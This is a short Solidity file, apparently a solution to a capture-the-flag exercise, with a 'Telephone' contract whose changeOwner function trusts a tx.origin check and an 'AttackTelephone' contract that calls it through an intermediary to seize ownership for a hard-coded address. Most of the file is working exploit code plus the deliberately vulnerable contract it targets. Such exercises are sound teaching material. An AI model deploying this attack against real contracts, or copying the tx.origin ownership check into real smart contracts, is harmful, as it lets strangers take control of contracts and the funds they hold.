// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackTelephone {
    address telephone = 0xeF93B6d16EefB3E49e7F57bB6da16e17a6E60a0f;
    address me = 0x684585A4E1F28D83F7404F0ec785758C100a3509;

    function ringRing() public {
        (bool success, bytes memory data) = telephone.call(
            abi.encodeWithSignature("changeOwner(address)", me)
        );

        require(success, "error on call function");
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
